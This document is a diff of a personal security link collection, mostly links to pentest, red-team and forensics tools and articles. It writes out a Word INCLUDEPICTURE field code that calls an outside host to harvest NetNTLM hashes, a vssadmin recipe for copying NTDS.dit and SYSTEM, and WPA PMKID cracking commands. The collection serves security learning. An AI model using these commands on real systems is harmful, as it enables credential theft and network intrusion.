@@ -26,7 +26,7 @@ a_trier
  * Microsoft Releases PowerShell Core for Linux as a Snap Package - https://thehackernews.com/2018/07/powershell-core-linux-snap.html
  * CTF framework and exploit development library http://pwntools.com and https://github.com/Gallopsled/pwntools
 
- * [WINspect](https://github.com/A-mIn3/WINspect) is part of a larger project for auditing different areas of Windows environments. It focuses on enumerating different parts of a Windows machine to identify security weaknesses and point to components that need further hardening. 
+ * [WINspect](https://github.com/A-mIn3/WINspect) is part of a larger project for auditing different areas of Windows environments. It focuses on enumerating different parts of a Windows machine to identify security weaknesses and point to components that need further hardening.
 
 
  * Investigate malicious Windows logon by visualizing and analyzing Windows event log https://github.com/JPCERTCC/LogonTracer
@@ -459,7 +459,7 @@ https://andrax-pentest.org/download
  * https://blog.rapid7.com/2018/10/09/introducing-metasploits-first-evasion-module/ | Metasploit's First Antivirus Evasion Modules: Evading AV Detection
  * https://github.com/ztgrace/red_team_telemetry | ztgrace/red_team_telemetry
  * https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/ | Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin – root@Hausec
- * 
+ *
 For harvesting NetNTLM hashes, Word is the gift that keeps on giving. Field codes, such as IncludePicture, can fetch remote resources at document load time. This functionality is even preserved when documents are exported as MSO Word XML docs. Cheers for those egress filters
 MACROBUTTON AutoOpen INCLUDEPICTURE "hxxps://secureaccess-se2[.]com/images/footer.jpg" \d \* MERGEFORMAT INCLUDEPICTURE "\\\\secureaccess-se2[.]com/logos/penelope.jpg" \d \* MERGEFORMAT
 https://twitter.com/bohops/status/1062935197107322880
@@ -538,7 +538,7 @@ An hourly updated list of subdomains gathered from certificate transparency logs
 https://github.com/internetwache/CT_subdomains
 
 https://grumpy-sec.blogspot.com/2018/12/i-csharp-your-clipboard-contents.html
-I C(Sharp) Your Clipboard Contents 
+I C(Sharp) Your Clipboard Contents
 
 http://www.sectechno.com/winpmem-memory-acquisition-tool/
 WinPmem – Memory Acquisition Tool
@@ -564,7 +564,7 @@ Using Burp Collaborator Client
 https://github.com/Voorivex/pentest-guide
 Penetration tests cases, resources and guidelines.
 
-Automating Simple Buffer Overflow with Winappdbg and Python 
+Automating Simple Buffer Overflow with Winappdbg and Python
 * [part 1](https://mohitdabas.wordpress.com/2017/10/19/automating-simple-buffer-overflow-with-winappdbg-and-python-part-1/)
 
 https://github.com/trimstray/OpenProxy
@@ -588,8 +588,6 @@ This repository contains scripts which may come in handy during your freedom fig
 https://www.zdnet.com/article/eastern-european-banks-lose-tens-of-millions-of-dollars-in-hollywood-style-hacks/
 Eastern European banks lose tens of millions of dollars in Hollywood-style hacks
 
-https://github.com/NytroRST/XSSFuzzer
-XSS Fuzzer is a tool which generates XSS payloads based on user-defined vectors and fuzzing lists.
 
 https://tsurugi-linux.org/index.php
 The new DFIR Linux distribution
@@ -598,7 +596,7 @@ https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-intern
 Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)
 
 https://www.kitploit.com/2018/11/mcreator-encoded-reverse-shell.html https://github.com/blacknbunny/mcreator
-Mcreator - Encoded Reverse Shell Generator With Techniques To Bypass AV's 
+Mcreator - Encoded Reverse Shell Generator With Techniques To Bypass AV's
 
 https://www.netsparker.com/whitepaper-http-security-headers/
 Whitepaper: HTTP Security Headers and How They Work
@@ -622,7 +620,7 @@ https://techblog.mediaservice.net/2018/11/universal-android-ssl-pinning-bypass-2
 Universal Android SSL Pinning Bypass #2
 
 https://www.kitploit.com/2018/11/pacu-aws-exploitation-framework.html https://github.com/RhinoSecurityLabs/pacu
-Pacu - The AWS Exploitation Framework, Designed For Testing The Security Of Amazon Web Services Environments 
+Pacu - The AWS Exploitation Framework, Designed For Testing The Security Of Amazon Web Services Environments
 
 https://twitter.com/elkentaro/status/1073637687939088386
 Deep penetration testing covert option..... now what?
@@ -664,12 +662,12 @@ https://www.kitploit.com/2018/12/cameradar-v210-hacks-its-way-into-rtsp.html?amp
 oletools - python tools to analyze MS OLE2 files (Structured Storage, Compound File Binary Format) and MS Office documents, for malware analysis, forensics and debugging. http://www.decalage.info/python/oletools
 Using HTTP Pipelining to hide requests https://digi.ninja/blog/pipelining.php
 BINDIFF uses a unique graph-theoretical approach to compare executables by identifying identical and similar functions https://www.zynamics.com/software.html
-https://twitter.com/nixcraft/status/1105095466641813504 Social engineering illustrated. I work as a sysadmin and developers/users hands out their API credentials, ssh keys, passwords like candy whenever they have an issue without asking about such info. I just don't trust end users ... 
+https://twitter.com/nixcraft/status/1105095466641813504 Social engineering illustrated. I work as a sysadmin and developers/users hands out their API credentials, ssh keys, passwords like candy whenever they have an issue without asking about such info. I just don't trust end users ...
 Cat-Nip - Automated Basic Pentest Tool (Designed For Kali Linux) https://www.kitploit.com/2019/03/cat-nip-automated-basic-pentest-tool.html https://github.com/baguswiratmaadi/catnip
 
 car hacking part 1 https://twitter.com/intx0x80/status/1104853927151976454 https://github.com/jgamblin/CarHackingTools
 Rooting all IOT ... https://www.exploitee.rs/
-PASSWORD HASH LOOKUP/CRACKING ONLINE: https://hashkiller.co.uk/Cracker  https://www.cmd5.org/  https://crack.sh/  https://gpuhash.me/  https://crackstation.net/  https://www.onlinehashcrack.com/  https://hash.help/  https://passwordrecovery.io/  http://cracker.offensive-security.com/ 
+PASSWORD HASH LOOKUP/CRACKING ONLINE: https://hashkiller.co.uk/Cracker  https://www.cmd5.org/  https://crack.sh/  https://gpuhash.me/  https://crackstation.net/  https://www.onlinehashcrack.com/  https://hash.help/  https://passwordrecovery.io/  http://cracker.offensive-security.com/
 GHIDRA : https://www.nsa.gov/resources/everyone/ghidra/ Ghidra is a software reverse engineering (SRE) framework developed by NSA's Research Directorate for NSA's cybersecurity mission. It helps analyze malicious code and malware like viruses, and can give cybersecurity professionals a better understanding of potential vulnerabilities in their networks and systems. https://ghidra-sre.org/
 	https://ghidra-sre.org/CheatSheet.html
 Arm Heap Exploitation - Part 1: Understanding the Glibc Heap Implementation https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/
@@ -681,17 +679,17 @@ ANDRAX The first and unique Penetration Testing platform for Android smartphones
 VSHG - Hardware resistance & enhanced security for GnuPG https://www.kitploit.com/2019/03/vshg-hardware-resistance-enhanced.html https://github.com/RichardRMatthews/VSHG
 
 https://github.com/houjingyi233/CPU-vulnerabiility-collections CPU-vulnerabiility-collections
-https://github.com/Cillian-Collins/dirscraper Dirscraper is an OSINT scanning tool which assists penetration testers in identifying hidden, or previously unknown, directories on a domain or subdomain. This helps greatly in the recon stage of pentesting as it provide pentesters with a larger attack surface for the specific domain. 
+https://github.com/Cillian-Collins/dirscraper Dirscraper is an OSINT scanning tool which assists penetration testers in identifying hidden, or previously unknown, directories on a domain or subdomain. This helps greatly in the recon stage of pentesting as it provide pentesters with a larger attack surface for the specific domain.
 PHP Security Check List https://github.com/ismailtasdelen/php-security-check-list
 
 https://twitter.com/TinkerSec/status/1098817274495094784 Don't have enough money for a GPU Hashcracker? Spin one up in AWS (p3.16xlarge 8x Tesla V100 GPU Instance)! Guess every 8 character (Upper, Lower, Number, Symbol) password (NTLM (Windows) Hash) in 3 hours, 10 minutes! Not bad for $25 an hour.
 
 How to steal NTDS.dit and SYSTEM file without fancy tools.
-	1. cmd 
-	2. vssadmin create shadow /for=C: 
-	3. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit 
+	1. cmd
+	2. vssadmin create shadow /for=C:
+	3. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit
 	4. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\SYSTEM c:\SYSTEM
-	
+
 ReverShellGenerator - A Tool to Generate Various Ways to Do a Reverse Shell https://www.kitploit.com/2017/12/revershellgenerator-tool-to-generate.html?amp=0
 https://github.com/Ledger-Donjon/lascar LASCAR: A fast, versatile, and open source python3 library designed to facilitate Side-Channel Analysis.
 
@@ -702,7 +700,7 @@ HOW TO CRACK WPA/WPA2 PMKID
 	4. Add BSSID in ‘bssid.txt’ and use ‘hcxdumptool’: hcxdumptool -i <int> --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap
 	5. Extract PMKID into hashcat format for cracking: https://github.com/ZerBea/hcxtools  hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap
 	6. Crack: hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt
-	
+
 Yara Rules of IOC : https://github.com/Neo23x0/signature-base/tree/master/yara
  new fast and flexible multi-platform IOC and YARA scanner SPARK in a reduced free version named SPARK Core https://www.nextron-systems.com/spark-core/
 https://github.com/Neo23x0/Loki Loki - Simple IOC and Incident Response Scanner https://www.nextron-systems.com/compare-our-scanners/
@@ -712,9 +710,9 @@ https://www.kitploit.com/2019/02/hontel-telnet-honeypot.html  Hontel - Telnet Ho
 https://hal.inria.fr/hal-01496958/document State of the art of network protocol reverse engineeringtools
 
 Fwknop - Single Packet Authorization & Port Knocking https://www.kitploit.com/2019/02/fwknop-single-packet-authorization-port.html https://github.com/mrash/fwknop
- 
+
 Active Directory Penetration Dojo – Setup of AD Penetration Lab : Part 1 to 4 https://scriptdotsh.com/index.php/category/active-directory-pentesting/
- 
+
 Modlishka - An Open Source Phishing Tool With 2FA Authentication  https://github.com/drk1wi/Modlishka https://www.kitploit.com/2019/02/modlishka-open-source-phishing-tool.html
 The Osmocom project is an umbrella project regarding Open source mobile communications. This includes software and tools implementing a variety of mobile communication standards, including GSM, DECT, TETRA and others. https://osmocom.org/
 Windows Privilege Escalation Guide https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
@@ -738,7 +736,7 @@ script to do instant MD5 collisions of any pair of PDFs
 https://github.com/corkami/pocs
 
 https://grumpy-sec.blogspot.com/2018/12/i-csharp-your-clipboard-contents.html
-I C(Sharp) Your Clipboard Contents 
+I C(Sharp) Your Clipboard Contents
 
 http://www.sectechno.com/winpmem-memory-acquisition-tool/
 WinPmem – Memory Acquisition Tool
@@ -764,7 +762,7 @@ Using Burp Collaborator Client
 https://github.com/Voorivex/pentest-guide
 Penetration tests cases, resources and guidelines.
 
-Automating Simple Buffer Overflow with Winappdbg and Python 
+Automating Simple Buffer Overflow with Winappdbg and Python
 * [part 1](https://mohitdabas.wordpress.com/2017/10/19/automating-simple-buffer-overflow-with-winappdbg-and-python-part-1/)
 
 https://github.com/trimstray/OpenProxy
@@ -788,9 +786,6 @@ This repository contains scripts which may come in handy during your freedom fig
 https://www.zdnet.com/article/eastern-european-banks-lose-tens-of-millions-of-dollars-in-hollywood-style-hacks/
 Eastern European banks lose tens of millions of dollars in Hollywood-style hacks
 
-https://github.com/NytroRST/XSSFuzzer
-XSS Fuzzer is a tool which generates XSS payloads based on user-defined vectors and fuzzing lists.
-
 https://tsurugi-linux.org/index.php
 The new DFIR Linux distribution
 
@@ -798,7 +793,7 @@ https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-intern
 Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)
 
 https://www.kitploit.com/2018/11/mcreator-encoded-reverse-shell.html https://github.com/blacknbunny/mcreator
-Mcreator - Encoded Reverse Shell Generator With Techniques To Bypass AV's 
+Mcreator - Encoded Reverse Shell Generator With Techniques To Bypass AV's
 
 https://www.netsparker.com/whitepaper-http-security-headers/
 Whitepaper: HTTP Security Headers and How They Work
@@ -822,12 +817,12 @@ https://techblog.mediaservice.net/2018/11/universal-android-ssl-pinning-bypass-2
 Universal Android SSL Pinning Bypass #2
 
 https://www.kitploit.com/2018/11/pacu-aws-exploitation-framework.html https://github.com/RhinoSecurityLabs/pacu
-Pacu - The AWS Exploitation Framework, Designed For Testing The Security Of Amazon Web Services Environments 
+Pacu - The AWS Exploitation Framework, Designed For Testing The Security Of Amazon Web Services Environments
 
 https://twitter.com/elkentaro/status/1073637687939088386
 Deep penetration testing covert option..... now what?
 
-GHIDRA : 
+GHIDRA :
  * https://github.com/NationalSecurityAgency/ghidra
  * https://thehackernews.com/2019/03/ghidra-reverse-engineering-tool.html
  * http://ghidra.re/online-courses/
@@ -881,7 +876,7 @@ https://pudding.cool/2018/10/city_3d/
 ANSSI : Bonnes pratiques pour l’acquisition et l’exploitation de noms de domaine
 https://www.ssi.gouv.fr/administration/guide/bonnes-pratiques-pour-lacquisition-et-lexploitation-de-noms-de-domaine/
 
-Search engines for hackers: 
+Search engines for hackers:
  * https://censys.io/  
  * https://www.shodan.io/  
  * https://viz.greynoise.io/table  
@@ -890,7 +885,7 @@ Search engines for hackers:
  * https://www.onyphe.io/  
  * https://app.binaryedge.io/  
  * https://hunter.io/  
- * https://wigle.net/ 
+ * https://wigle.net/
 
 attacks on PDF Signatures
 https://www.pdf-insecurity.org/signature/signature.html
@@ -902,7 +897,7 @@ https://github.com/uxmal/reko
 What the HELK? SIGMA integration via Elastalert
 https://posts.specterops.io/what-the-helk-sigma-integration-via-elastalert-6edf1715b02
 
-Cuteit v0.2.1 - IP Obfuscator Made To Make A Malicious Ip A Bit Cuter 
+Cuteit v0.2.1 - IP Obfuscator Made To Make A Malicious Ip A Bit Cuter
 https://github.com/D4Vinci/Cuteit
 
 Infinite loop in javascript ...
@@ -915,7 +910,7 @@ window.alert("　∧_∧　ババババ\n（ ・ω・)=つ≡つ\n（っ ≡つ=
 DNS-Shell - An Interactive Shell Over DNS Channel
 https://github.com/sensepost/DNS-Shell
 
-DOGE - Darknet Osint Graph Explorer 
+DOGE - Darknet Osint Graph Explorer
 https://github.com/pielco11/DOGE
 
 
@@ -924,11 +919,11 @@ https://github.com/decoder-it/powershellveryless
 
 https://krebsonsecurity.com/2012/10/the-scrap-value-of-a-hacked-pc-revisited/ The Scrap Value of a Hacked PC, Revisited
 
-https://github.com/KeepWannabe/Remot3d Remot3d v2.0 - Tool Created For Large Pentesters As Well As Just For The Pleasure Of Defacers To Control Server By Backdoors 
+https://github.com/KeepWannabe/Remot3d Remot3d v2.0 - Tool Created For Large Pentesters As Well As Just For The Pleasure Of Defacers To Control Server By Backdoors
 
 Savez-vous à quand remonte la première cyber-attaque ? 1980 ? Non avant. 1950 ? Non, encore avant ! 1920 ? Toujours pas ! C'était en 1834 ! Et cette première cyber-attaque n'a pas eu lieu aux Etats-Unis, mais en France !
 https://twitter.com/Benazdia/status/1110814927768481792
- 
+
  * https://github.com/besimorhino/powercat | besimorhino/powercat: netshell features all in version 2 powershell
  * https://www.kitploit.com/2018/01/snmp-brute-fast-snmp-brute-force.html?amp=0 | SNMP-Brute - Fast SNMP brute force, enumeration, CISCO config downloader and password cracking script - KitPloit - PenTest & Hacking Tools for your CyberSecurity Kit ☣
  * https://ngailong.wordpress.com/2019/04/07/old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice/ | Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice – Ron Chan
@@ -1013,11 +1008,6 @@ https://twitter.com/Benazdia/status/1110814927768481792
  * https://www.marcolancini.it/2018/blog-hacker-playbook-mindmap/ | Red Teaming Mind Map from The Hacker Playbook 3 – Marco Lancini
  * [Draw.io for threat modeling](https://michenriksen.com/blog/drawio-for-threat-modeling/)
 
-## Collision MD5
-* https://www.win.tue.nl/hashclash/
-* https://github.com/nneonneo/sha1collider
-* https://shattered.io/
-* https://github.com/corkami/collisions
 
 
 [a "PoC or GTFO" mirror with extra article index, direct links and clean PDFs.]( https://github.com/angea/pocorgtfo)
@@ -1037,11 +1027,10 @@ CRC RevEng: arbitrary-precision CRC calculator and algorithm finder http://reven
 [Bit.do URL Shortener - Shorten, customize and track your links. Make a long URL short, easy to remember and to share. With traffic stats.](https://bit.do/) - Add a dash at the end of the shortened url to win acces to stats and real destination.
 [Les réductions d'URLs et la sécurité](https://www.malekal.com/reductions-urls-securite/) Les problèmes de sécurité que posent les réductions d'URLs. Comment révéler/voir l'URL finale sans avoir à cliquer dessus
 
+
 # BlockList URL
 * https://firebog.net/
 * https://discourse.pi-hole.net/t/update-the-best-blocking-lists-for-the-pi-hole-alternative-dns-servers-2019/13620
 * Light @ 327KB (~20,000 domains): Chad Mayfield (from Top 1M) https://raw.githubusercontent.com/chadmayfield/my-pihole-blocklists/master/lists/pi_blocklist_porn_top1m.list
 * Heavy @ ~45MB (~1.7m domains): Chad Mayfield (All) https://raw.githubusercontent.com/chadmayfield/my-pihole-blocklists/master/lists/pi_blocklist_porn_all.list
 * https://chadmayfield.com/2017/06/29/blocking-porn-with-pihole/
-
-
